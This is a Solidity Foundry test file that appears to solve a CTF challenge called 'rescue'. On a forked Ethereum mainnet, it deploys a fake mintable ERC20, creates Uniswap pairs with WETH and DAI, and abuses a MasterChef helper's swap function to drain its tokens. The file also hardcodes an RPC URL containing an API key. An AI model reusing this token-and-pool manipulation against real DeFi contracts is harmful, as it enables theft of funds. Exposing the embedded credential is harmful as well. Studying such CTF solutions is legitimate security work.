// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "forge-std/console2.sol";
import "forge-std/Test.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Setup, WETH9, MasterChefHelper, MasterChefLike, UniswapV2RouterLike, ERC20Like} from "../src/rescue/Setup.sol";

contract FakeERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function setBalance(address destination, uint256 amount) external {
        _burn(destination, balanceOf(destination));
        _mint(destination, amount);
        emit Transfer(address(0), destination, amount);
    }

    function uncheckedTransfer(address destination, uint256 amount) external {
        _mint(destination, amount);
        emit Transfer(address(0), destination, amount);
    }

    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function migrator() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint256) external view returns (address pair);
    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function setMigrator(address) external;
}

contract ExploitRandom is Test {
    using stdStorage for StdStorage;

    StdStorage _stdstore;

    Setup s;
    MasterChefHelper mcHelper;
    MasterChefLike masterchef;
    UniswapV2RouterLike router;
    WETH9 WETH;
    IUniswapV2Pair daiWethLpTkn;
    ERC20Like DAI = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IUniswapV2Factory factory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);

    uint256 poolIdDaiWeth = 2;

    function setUp() public {
        vm.label(address(this), "User");
        uint256 forkId = vm.createFork("https://eth-mainnet.alchemyapi.io/v2/kwjMP-X-Vajdk1ItCfU-56Uaq1wwhamK");

        vm.selectFork(forkId);
        vm.rollFork(15471120);

        s = new Setup{value: 10 ether}();
        vm.label(address(s), "setup");

        WETH = s.weth();
        mcHelper = s.mcHelper();
        masterchef = mcHelper.masterchef();
        router = mcHelper.router();

        (address _daiWethLpTkn,,,) = masterchef.poolInfo(poolIdDaiWeth);
        daiWethLpTkn = IUniswapV2Pair(_daiWethLpTkn);

        vm.label(address(factory), "factory");
        vm.label(address(DAI), "DAI");
        vm.label(address(WETH), "WETH");
        vm.label(address(mcHelper), "mcHelper");
        vm.label(address(masterchef), "masterchef");
        vm.label(address(router), "router");
        vm.label(address(daiWethLpTkn), "DAI_WETH_LP");
    }

    function writeTokenBalance(address who, address token, uint256 amt) internal {
        _stdstore.target(token).sig(IERC20(token).balanceOf.selector).with_key(who).checked_write(amt);
    }

    function test__exploit() public {
        // Create FKE token
        FakeERC20 FKE = new FakeERC20("Fake Token", "FKE");
        vm.label(address(FKE), "FKE");

        // Create UniswapPairs
        IUniswapV2Pair wethFkeLpTkn = IUniswapV2Pair(factory.createPair(address(WETH), address(FKE)));
        vm.label(address(wethFkeLpTkn), "WETH_FKE_LP");

        IUniswapV2Pair daiFkeLpTkn = IUniswapV2Pair(factory.createPair(address(DAI), address(FKE)));
        vm.label(address(daiFkeLpTkn), "DAI_FKE_LP");

        (uint256 wethAmountPerUnitDai, uint256 daiAmountPerUnitWeth) = logPair(daiWethLpTkn);

        FKE.mint(address(this), 2e18);
        writeTokenBalance(address(this), address(DAI), 1e18);
        WETH.deposit{value: 1e18}();

        FKE.approve(address(router), type(uint256).max);
        DAI.approve(address(router), type(uint256).max);
        WETH.approve(address(router), type(uint256).max);

        // add liquidity to WETH/FKE
        router.addLiquidity(address(WETH), address(FKE), 1e18, 1e18, 0, 0, address(this), block.timestamp);

        // add liquidity to USDC/FKE
        router.addLiquidity(address(DAI), address(FKE), 1e18, 1e18, 0, 0, address(this), block.timestamp);

        logPair(wethFkeLpTkn);
        logPair(daiFkeLpTkn);

        FKE.mint(address(this), 10e18);
        FKE.approve(address(mcHelper), type(uint256).max);

        // logPair(wethFkeLpTkn);
        // logPair(usdcFkeLpTkn);
        // console2.log("USDC/WETH User balance %s: ", daiWethLpTkn.balanceOf(address(this)));
        // console2.log("WETH mcHelper balance %s: ", WETH.balanceOf(address(mcHelper)));
        // logPair(IUniswapV2Pair(address(daiWethLpTkn)));

        mcHelper.swapTokenForPoolToken(poolIdDaiWeth, address(FKE), 1e18, 0);

        // console2.log("###############################################");
        // console2.log("###############################################");
        // console2.log("###############################################");
        // console2.log();

        // logPair(wethFkeLpTkn);
        // logPair(usdcFkeLpTkn);
        // console2.log("USDC/WETH User balance %s: ", daiWethLpTkn.balanceOf(address(this)));
        // console2.log("WETH mcHelper balance %s: ", WETH.balanceOf(address(mcHelper)));
        // logPair(IUniswapV2Pair(address(daiWethLpTkn)));

        assertTrue(s.isSolved());
    }

    function logPair(IUniswapV2Pair pair) public view returns (uint256 quote0, uint256 quote1) {
        ERC20 t0 = ERC20(pair.token0());
        ERC20 t1 = ERC20(pair.token1());
        string memory s0 = t0.symbol();
        string memory s1 = t1.symbol();
        (uint256 r0, uint256 r1,) = pair.getReserves();

        quote0 = router.quote(1e18, r0, r1);
        quote1 = router.quote(1e18, r1, r0);

        console2.log("## %s/%s LP Reserves ##", s0, s1);
        console2.log("Token0 :: %s :: %s", s0, r0);
        console2.log("Price0 :: %s %s/%s", quote0, s0, s1);
        console2.log("Token1 :: %s :: %s", s1, r1);
        console2.log("Price1 :: %s %s/%s", quote1, s1, s0);
        console2.log();
    }
}
